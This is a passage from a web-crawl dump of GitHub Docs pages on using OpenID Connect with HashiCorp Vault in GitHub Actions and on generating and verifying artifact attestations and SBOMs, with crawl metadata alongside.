settings](#adding-permissions-settings)\n\nThe job or workflow run requires a `permissions` setting with [`id-token: write`](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the `permissions` for `id-token` is not set to `write`, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n\nThe `id-token: write` setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\n\n*   Using environment variables on the runner (`ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`).\n*   Using `getIDToken()` from the Actions toolkit.\n\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n```\n\nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n```\n\nYou may need to specify additional permissions here, depending on your workflow's requirements.\n\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the `permissions` setting for `id-token` should be explicitly set to `write` at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\n\nFor more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\nNote\n\nWhen the `permissions` key is used, all unspecified permissions are set to _no access_, with the exception of the metadata scope, which always gets _read_ access. As a result, you may need to add other permissions, such as `contents: read`. See [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication) for more information.\n\n### [Requesting the access token](#requesting-the-access-token)\n\nThe `hashicorp/vault-action` action receives a JWT from the GitHub OIDC provider, and then requests an access token from your HashiCorp Vault instance to retrieve secrets. For more information, see the HashiCorp Vault GitHub Action [documentation](https://github.com/hashicorp/vault-action).\n\nThis example demonstrates how to create a job that requests a secret from HashiCorp Vault.\n\n*   `VAULT-URL`: Replace this with the URL of your HashiCorp Vault.\n*   `VAULT-NAMESPACE`: Replace this with the Namespace you've set in HashiCorp Vault. For example: `admin`.\n*   `ROLE-NAME`: Replace this with the role you've set in the HashiCorp Vault trust relationship.\n*   `SECRET-PATH`: Replace this with the path to the secret you're retrieving from HashiCorp Vault. For example: `secret/data/production/ci npmToken`.\n\nYAML\n\n```\njobs:\n  retrieve-secret:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - name: Retrieve secret from Vault\n        uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b\n        with:\n          method: jwt\n          url: VAULT-URL\n          namespace: VAULT-NAMESPACE # HCP Vault and Vault Enterprise only\n          role: ROLE-NAME\n          secrets: SECRET-PATH\n\n      - name: Use secret from Vault\n        run: |\n          # This step has access to the secret retrieved above; see hashicorp/vault-action for more details.\n```\n\nNote\n\n*   If your Vault server is not accessible from the public network, consider using a self-hosted runner with other available Vault [auth methods](https://www.vaultproject.io/docs/auth). For more information, see [About self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners).\n*   `VAULT-NAMESPACE` must be set for a Vault Enterprise (including HCP Vault) deployment. For more information, see [Vault namespace](https://www.vaultproject.io/docs/enterprise/namespaces).\n\n### [Revoking the access token](#revoking-the-access-token)\n\nBy default, the Vault server will automatically revoke access tokens when their TTL is expired, so you don't have to manually revoke the access tokens. However, if you do want to revoke access tokens immediately after your job has completed or failed, you can manually revoke the issued token using the [Vault API](https://www.vaultproject.io/api/auth/token#revoke-a-token-self).\n\n1.  Set the `exportToken` option to `true` (default: `false`). This exports the issued Vault access token as an environment variable: `VAULT_TOKEN`.\n2.  Add a step to call the [Revoke a Token (Self)](https://www.vaultproject.io/api/auth/token#revoke-a-token-self) Vault API to revoke the access token.\n\nYAML\n\n```\njobs:\n  retrieve-secret:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - name: Retrieve secret from Vault\n        uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b\n        with:\n          exportToken: true\n          method: jwt\n          url: VAULT-URL\n          role: ROLE-NAME\n          secrets: SECRET-PATH\n\n      - name: Use secret from Vault\n        run: |\n          # This step has access to the secret retrieved above; see hashicorp/vault-action for more details.\n\n      - name: Revoke token\n        # This step always runs at the end regardless of the previous steps result\n        if: always()\n        run: |\n          curl -X POST -sv -H \"X-Vault-Token: ${{ env.VAULT_TOKEN }}\" \\\n            VAULT-URL/v1/auth/token/revoke-self\n```\n\n## [Further reading](#further-reading)\n\n*   [Using OpenID Connect with reusable workflows](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows)\n*   [Communicating with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 263,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-hashicorp-vault-origi",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-hashicorp-vault-remov",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-hashicorp-vault-extra",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-hashicorp-vault-reada",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-hashicorp-vault-reada"
    },
    "lengths": {
      "extractus": 17666,
      "readableText": 16501,
      "none": 44685,
      "readableTextIfPossible": 16501,
      "result": 16501,
      "markdown": 13048
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds",
    "loadedTime": "2025-05-08T06:36:59.618Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds",
    "title": "Using artifact attestations to establish provenance for builds - GitHub Docs",
    "description": "Artifact attestations enable you to increase the supply chain security of your builds by establishing where and how your software was built.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using artifact attestations to establish provenance for builds - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "DA84:1DEC:7552:969B:681C5106",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:36:54 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686214.226932, VS0, VE348",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30291",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using artifact attestations to establish provenance for builds\nArtifact attestations enable you to increase the supply chain security of your builds by establishing where and how your software was built.\nWho can use this feature?\nArtifact attestations are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, artifact attestations are only available for public repositories. To use artifact attestations in private or internal repositories, you must be on a GitHub Enterprise Cloud plan.\nAbout artifact attestations\nArtifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.\nWhen you generate artifact attestations with your software, you create cryptographically signed claims that establish your build's provenance and include the following information:\nA link to the workflow associated with the artifact.\nThe repository, organization, environment, commit SHA, and triggering event for the artifact.\nOther information from the OIDC token used to establish provenance. For more information, see About security hardening with OpenID Connect.\nYou can also generate artifact attestations that include an associated software bill of materials (SBOM). Associating your builds with a list of the open source dependencies used in them provides transparency and enables consumers to comply with data protection standards.\nAbout SLSA levels for artifact attestations\nThe SLSA framework is an industry standard used to evaluate supply chain security. It is organized into levels. Each level represents an increasing degree of security and trustworthiness for a software supply chain. Artifact attestations by itself provides SLSA v1.0 Build Level 2.\nThis provides a link between your artifact and its build instructions, but you can take this a step further by requiring builds make use of known, vetted build instructions. A great way to do this is to have your build take place in a reusable workflow that many repositories across your organization share. Reusable workflows can provide isolation between the build process and the calling workflow, to meet SLSA v1.0 Build Level 3. For more information, see Using artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3.\nFor more information on SLSA levels, see SLSA Security Levels.\nAbout using Sigstore for artifact attestations\nTo generate artifact attestations, GitHub uses Sigstore, which is an open source project that offers a comprehensive solution for signing and verifying software artifacts via attestations.\nPublic repositories that generate artifact attestations use the Sigstore Public Good Instance. A copy of the generated Sigstore bundle is stored with GitHub and is also written to an immutable transparency log that is publicly readable on the internet.\nPrivate repositories that generate artifact attestations use GitHub's Sigstore instance. GitHub's Sigstore instance uses the same codebase as the Sigstore Public Good Instance, but it does not have a transparency log and only federates with GitHub Actions.\nWhat to attest\nGenerating attestations alone doesn't provide any security benefit, the attestations must be verified for the benefit to be realized. Here are some guidelines for how to think about what to sign and how often:\nYou should sign:\nSoftware you are releasing that you expect people to run gh attestation verify ... on.\nBinaries people will run, packages people will download, or manifests that include hashes of detailed contents.\nYou should not sign:\nFrequent builds that are just for automated testing.\nIndividual files like source code, documentation files, or embedded images.\nAbout verifying artifact attestations\nIf you consume software that publishes artifact attestations, you can use the GitHub CLI to verify those attestations. Because the attestations give you information about where and how software was built, you can use that information to create and enforce security policies that elevate your supply chain security. For more information, see Verifying artifact attestations with the GitHub CLI.\nWarning\nIt is important to remember that artifact attestations are not a guarantee that an artifact is secure. Instead, artifact attestations link you to the source code and the build instructions that produced them. It is up to you to define your policy criteria, evaluate that policy by evaluating the content, and make an informed risk decision when you are consuming software.\nGenerating artifact attestations for your builds\nYou can use GitHub Actions to generate artifact attestations that establish build provenance for artifacts such as binaries and container images.\nTo generate an artifact attestation, you must:\nEnsure you have the appropriate permissions configured in your workflow.\nInclude a step in your workflow that uses the attest-build-provenance action.\nWhen you run your updated workflows, they will build your artifacts and generate an artifact attestation that establishes build provenance. You can view attestations in your repository's Actions tab. For more information, see the attest-build-provenance repository.\nGenerating build provenance for binaries\nIn the workflow that builds the binary you would like to attest, add the following permissions.\npermissions: id-token: write contents: read attestations: write \nAfter the step where the binary has been built, add the following step.\n- name: Generate artifact attestation uses: actions/attest-build-provenance@v2 with: subject-path: 'PATH/TO/ARTIFACT' \nThe value of the subject-path parameter should be set to the path to the binary you want to attest.\nGenerating build provenance for container images\nIn the workflow that builds the container image you would like to attest, add the following permissions.\npermissions: id-token: write contents: read attestations: write packages: write \nAfter the step where the image has been built, add the following step.\n- name: Generate artifact attestation uses: actions/attest-build-provenance@v2 with: subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }} subject-digest: 'sha256:fedcba0...' push-to-registry: true \nThe value of the subject-name parameter should specify the fully-qualified image name. For example, ghcr.io/user/app or acme.azurecr.io/user/app. Do not include a tag as part of the image name.\nThe value of the subject-digest parameter should be set to the SHA256 digest of the subject for the attestation, in the form sha256:HEX_DIGEST. If your workflow uses docker/build-push-action, you can use the digest output from that step to supply the value. For more information on using outputs, see Workflow syntax for GitHub Actions.\nGenerating an attestation for a software bill of materials (SBOM)\nYou can generate signed SBOM attestations for workflow artifacts.\nTo generate an attestation for an SBOM, you must:\nEnsure you have the appropriate permissions configured in your workflow.\nCreate an SBOM for your artifact. For more information, see anchore-sbom-action in the GitHub Marketplace.\nInclude a step in your workflow that uses the attest-sbom action.\nWhen you run your updated workflows, they will build your artifacts and generate an SBOM attestation. You can view attestations in your repository's Actions tab. For more information, see the attest-sbom action repository.\nGenerating an SBOM attestation for binaries\nIn the workflow that builds the binary you would like to attest, add the following permissions.\npermissions: id-token: write contents: read attestations: write \nAfter the step where the binary has been built, add the following step.\n- name: Generate SBOM attestation uses: actions/attest-sbom@v1 with: subject-path: 'PATH/TO/ARTIFACT' sbom-path: 'PATH/TO/SBOM' \nThe value of the subject-path parameter should be set to the path of the binary the SBOM describes. The value of the sbom-path parameter should be set to the path of the SBOM file you generated.\nGenerating an SBOM attestation for container images\nIn the workflow that builds the container image you would like to attest, add the following permissions.\npermissions: id-token: write contents: read attestations: write packages: write \nAfter the step where the image has been built, add the following step.\n- name: Generate SBOM attestation uses: actions/attest-sbom@v1 with: subject-name: ${{ env.REGISTRY }}/PATH/TO/IMAGE subject-digest: 'sha256:fedcba0...' sbom-path: 'sbom.json' push-to-registry: true \nThe value of the subject-name parameter should specify the fully-qualified image name. For example, ghcr.io/user/app or acme.azurecr.io/user/app. Do not include a tag as part of the image name.\nThe value of the subject-digest parameter should be set to the SHA256 digest of the subject for the attestation, in the form sha256:HEX_DIGEST. If your workflow uses docker/build-push-action, you can use the digest output from that step to supply the value. For more information on using outputs, see Workflow syntax for GitHub Actions.\nThe value of the sbom-path parameter should be set to the path to the JSON-formatted SBOM file you want to attest.\nVerifying artifact attestations with the GitHub CLI\nYou can validate artifact attestations for binaries and container images and validate SBOM attestations using the GitHub CLI. For more information, see the attestation section of the GitHub CLI manual.\nVerifying an artifact attestation for binaries\nTo verify artifact attestations for binaries, use the following GitHub CLI command.\nBash\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME \nVerifying an artifact attestation for container images\nTo verify artifact attestations for container images, you must provide the image's FQDN prefixed with oci:// instead of the path to a binary. You can use the following GitHub CLI command.\nBash\ndocker login ghcr.io gh attestation verify oci://ghcr.io/ORGANIZATION_NAME/IMAGE_NAME:test -R ORGANIZATION_NAME/REPOSITORY_NAME \nVerifying an attestation for SBOMs\nTo verify SBOM attestations, you have to provide the --predicate-type flag to reference a non-default predicate. For more information, see Vetted predicates in the in-toto/attestation repository.\nFor example, the attest-sbom action currently supports either SPDX or CycloneDX SBOM predicates. To verify an SBOM attestation in the SPDX format, you can use the following GitHub CLI command.\nBash\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\ -R ORGANIZATION_NAME/REPOSITORY_NAME \\ --predicate-type https://spdx.dev/Document/v2.3 \nTo view more information on the attestation, reference the --format json flag. This can be especially helpful when reviewing SBOM attestations.\nBash\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\ -R ORGANIZATION_NAME/REPOSITORY_NAME \\ --predicate-type https://spdx.dev/Document/v2.3 \\ --format json \\ --jq '.[].verificationResult.statement.predicate'",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-to-establish-provenance-for-bui-ybgsv.html",
  "markdown": "# Using artifact attestations to establish provenance for builds\n\nArtifact attestations enable you to increase the supply chain security of your builds by establishing where and how your software was built.\n\n## Who can use this feature?\n\nArtifact attestations are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, artifact attestations are only available for public repositories. To use artifact attestations in private or internal repositories, you must be on a GitHub Enterprise Cloud plan.\n\n## [About artifact attestations](#about-artifact-attestations)\n\nArtifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.\n\nWhen you generate artifact attestations with your software, you create cryptographically signed claims that establish your build's provenance and include the following information:\n\n*   A link to the workflow associated with the artifact.\n*   The repository, organization, environment, commit SHA, and triggering event for the artifact.\n*   Other information from the OIDC token used to establish provenance. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n\nYou can also generate artifact attestations that include an associated software bill of materials (SBOM). Associating your builds with a list of the open source dependencies used in them provides transparency and enables consumers to comply with data protection standards.\n\n### [About SLSA levels for artifact attestations](#about-slsa-levels-for-artifact-attestations)\n\nThe SLSA framework is an industry standard used to evaluate supply chain security. It is organized into levels. Each level represents an increasing degree of security and trustworthiness for a software supply chain. Artifact attestations by itself provides SLSA v1.0 Build Level 2.\n\nThis provides a link between your artifact and its build instructions, but you can take this a step further by requiring builds make use of known, vetted build instructions. A great way to do this is to have your build take place in a reusable workflow that many repositories across your organization share. Reusable workflows can provide isolation between the build process and the calling workflow, to meet SLSA v1.0 Build Level 3. For more information, see [Using artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3).\n\nFor more information on SLSA levels, see [SLSA Security Levels](https://slsa.dev/spec/v1.0/levels).\n\n### [About using Sigstore for artifact attestations](#about-using-sigstore-for-artifact-attestations)\n\nTo generate artifact attestations, GitHub uses Sigstore, which is an open source project that offers a comprehensive solution for signing and verifying software artifacts via attestations.\n\n**Public repositories** that generate artifact attestations use the [Sigstore Public Good Instance](https://openssf.org/blog/2023/10/03/running-sigstore-as-a-managed-service-a-tour-of-sigstores-public-good-instance/). A copy of the generated Sigstore bundle is stored with GitHub and is also written to an immutable transparency log that is publicly readable on the internet.\n\n**Private repositories** that generate artifact attestations use GitHub's Sigstore instance. GitHub's Sigstore instance uses the same codebase as the Sigstore Public Good Instance, but it does not have a transparency log and only federates with GitHub Actions.\n\n### [What to attest](#what-to-attest)\n\nGenerating attestations alone doesn't provide any security benefit, the attestations must be verified for the benefit to be realized. Here are some guidelines for how to think about what to sign and how often:\n\nYou should sign:\n\n*   Software you are releasing that you expect people to run `gh attestation verify ...` on.\n*   Binaries people will run, packages people will download, or manifests that include hashes of detailed contents.\n\nYou should **not** sign:\n\n*   Frequent builds that are just for automated testing.\n*   Individual files like source code, documentation files, or embedded images.\n\n### [About verifying artifact attestations](#about-verifying-artifact-attestations)\n\nIf you consume software that publishes artifact attestations, you can use the GitHub CLI to verify those attestations. Because the attestations give you information about where and how software was built, you can use that information to create and enforce security policies that elevate your supply chain security. For more information, see [Verifying artifact attestations with the GitHub CLI](#verifying-artifact-attestations-with-the-github-cli).\n\nWarning\n\nIt is important to remember that artifact attestations are _not_ a guarantee that an artifact is secure. Instead, artifact attestations link you to the source code and the build instructions that produced them. It is up to you to define your policy criteria, evaluate that policy by evaluating the content, and make an informed risk decision when you are consuming software.\n\n## [Generating artifact attestations for your builds](#generating-artifact-attestations-for-your-builds)\n\nYou can use GitHub Actions to generate artifact attestations that establish build provenance for artifacts such as binaries and container images.\n\nTo generate an artifact attestation, you must:\n\n*   Ensure you have the appropriate permissions configured in your workflow.\n*   Include a step in your workflow that uses the [`attest-build-provenance` action](https://github.com/actions/attest-build-provenance).\n\nWhen you run your updated workflows, they will build your artifacts and generate an artifact attestation that establishes build provenance. You can view attestations in your repository's **Actions** tab. For more information, see the [`attest-build-provenance`](https://github.com/actions/attest-build-provenance) repository.\n\n### [Generating build provenance for binaries](#generating-build-provenance-for-binaries)\n\n1.  In the workflow that builds the binary you would like to attest, add the following permissions.\n    \n    ```\n    permissions:\n      id-token: write\n      contents: read\n      attestations: write\n    ```\n    \n2.  After the step where the binary has been built, add the following step.\n    \n    ```\n    - name: Generate artifact attestation\n      uses: actions/attest-build-provenance@v2\n      with:\n        subject-path: 'PATH/TO/ARTIFACT'\n    ```\n    \n    The value of the `subject-path` parameter should be set to the path to the binary you want to attest.\n    \n\n### [Generating build provenance for container images](#generating-build-provenance-for-container-images)\n\n1.  In the workflow that builds the container image you would like to attest, add the following permissions.\n    \n    ```\n    permissions:\n      id-token: write\n      contents: read\n      attestations: write\n      packages: write\n    ```\n    \n2.  After the step where the image has been built, add the following step.\n    \n    ```\n    - name: Generate artifact attestation\n      uses: actions/attest-build-provenance@v2\n      with:\n        subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n        subject-digest: 'sha256:fedcba0...'\n        push-to-registry: true\n    ```\n    \n    The value of the `subject-name` parameter should specify the fully-qualified image name. For example, `ghcr.io/user/app` or `acme.azurecr.io/user/app`. Do not include a tag as part of the image name.\n    \n    The value of the `subject-digest` parameter should be set to the SHA256 digest of the subject for the attestation, in the form `sha256:HEX_DIGEST`. If your workflow uses `docker/build-push-action`, you can use the [`digest`](https://github.com/docker/build-push-action?tab=readme-ov-file#outputs) output from that step to supply the value. For more information on using outputs, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idoutputs).\n    \n\n## [Generating an attestation for a software bill of materials (SBOM)](#generating-an-attestation-for-a-software-bill-of-materials-sbom)\n\nYou can generate signed SBOM attestations for workflow artifacts.\n\nTo generate an attestation for an SBOM, you must:\n\n*   Ensure you have the appropriate permissions configured in your workflow.\n*   Create an SBOM for your artifact. For more information, see [`anchore-sbom-action`](https://github.com/marketplace/actions/anchore-sbom-action) in the GitHub Marketplace.\n*   Include a step in your workflow that uses the [`attest-sbom` action](https://github.com/actions/attest-sbom).\n\nWhen you run your updated workflows, they will build your artifacts and generate an SBOM attestation. You can view attestations in your repository's **Actions** tab. For more information, see the [`attest-sbom` action](https://github.com/actions/attest-sbom) repository.\n\n### [Generating an SBOM attestation for binaries](#generating-an-sbom-attestation-for-binaries)\n\n1.  In the workflow that builds the binary you would like to attest, add the following permissions.\n    \n    ```\n    permissions:\n      id-token: write\n      contents: read\n      attestations: write\n    ```\n    \n2.  After the step where the binary has been built, add the following step.\n    \n    ```\n    - name: Generate SBOM attestation\n      uses: actions/attest-sbom@v1\n      with:\n        subject-path: 'PATH/TO/ARTIFACT'\n        sbom-path: 'PATH/TO/SBOM'\n    ```\n    \n    The value of the `subject-path` parameter should be set to the path of the binary the SBOM describes. The value of the `sbom-path` parameter should be set to the path of the SBOM file you generated.\n    \n\n### [Generating an SBOM attestation for container images](#generating-an-sbom-attestation-for-container-images)\n\n1.  In the workflow that builds the container image you would like to attest, add the following permissions.\n    \n    ```\n    permissions:\n      id-token: write\n      contents: read\n      attestations: write\n      packages: write\n    ```\n    \n2.  After the step where the image has been built, add the following step.\n    \n    ```\n    - name: Generate SBOM attestation\n      uses: actions/attest-sbom@v1\n      with:\n        subject-name: ${{ env.REGISTRY }}/PATH/TO/IMAGE\n        subject-digest: 'sha256:fedcba0...'\n        sbom-path: 'sbom.json'\n        push-to-registry: true\n    ```\n    \n    The value of the `subject-name` parameter should specify the fully-qualified image name. For example, `ghcr.io/user/app` or `acme.azurecr.io/user/app`. Do not include a tag as part of the image name.\n    \n    The value of the `subject-digest` parameter should be set to the SHA256 digest of the subject for the attestation, in the form `sha256:HEX_DIGEST`. If your workflow uses `docker/build-push-action`, you can use the [`digest`](https://github.com/docker/build-push-action?tab=readme-ov-file#outputs) output from that step to supply the value. For more information on using outputs, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idoutputs).\n    \n    The value of the `sbom-path` parameter should be set to the path to the JSON-formatted SBOM file you want to attest.\n    \n\n## [Verifying artifact attestations with the GitHub CLI](#verifying-artifact-attestations-with-the-github-cli)\n\nYou can validate artifact attestations for binaries and container images and validate SBOM attestations using the GitHub CLI. For more information, see the [`attestation`](https://cli.github.com/manual/gh_attestation) section of the GitHub CLI manual.\n\n### [Verifying an artifact attestation for binaries](#verifying-an-artifact-attestation-for-binaries)\n\nTo verify artifact attestations for **binaries**, use the following GitHub CLI command.\n\nBash\n\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME\n```\n\n### [Verifying an artifact attestation for container images](#verifying-an-artifact-attestation-for-container-images)\n\nTo verify artifact attestations for **container images**, you must provide the image's FQDN prefixed with `oci://` instead of the path to a binary. You can use the following GitHub CLI command.\n\nBash\n\n```\ndocker login ghcr.io\n\ngh attestation verify oci://ghcr.io/ORGANIZATION_NAME/IMAGE_NAME:test -R ORGANIZATION_NAME/REPOSITORY_NAME\n```\n\n### [Verifying an attestation for SBOMs](#verifying-an-attestation-for-sboms)\n\nTo verify SBOM attestations, you have to provide the `--predicate-type` flag to reference a non-default predicate. For more information, see [Vetted predicates](https://github.com/in-toto/attestation/tree/main/spec/predicates#vetted-predicates) in the `in-toto/attestation` repository.\n\nFor example, the [`attest-sbom` action](https://github.com/actions/attest-sbom) currently supports either SPDX or CycloneDX SBOM predicates. To verify an SBOM attestation in the SPDX format, you can use the following GitHub CLI command.\n\nBash\n\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\\n  -R ORGANIZATION_NAME/REPOSITORY_NAME \\\n  --predicate-type https://spdx.dev/Document/v2.3\n```\n\nTo view more information on the attestation, reference the `--format json` flag. This can be especially helpful when reviewing SBOM attestations.\n\nBash\n\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\\n  -R ORGANIZATION_NAME/REPOSITORY_NAME \\\n  --predicate-type https://spdx.dev/Document/v2.3 \\\n  --format json \\\n  --jq '.[].verificationResult.statement.predicate'\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 259,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-to-establish-provenance-for-bui",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-to-establish-provenance-for-bui",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-to-establish-provenance-for-bui",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-to-establish-provenance-for-bui",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-to-establish-provenance-for-bui"
    },
    "lengths": {
      "extractus": 20077,
      "readableText": 17723,
      "none": 40642,
      "readableTextIfPossible": 17723,
      "result": 17723,
      "markdown": 13930
    },
    "requestHandlerMode": "browser"
  }
},
{
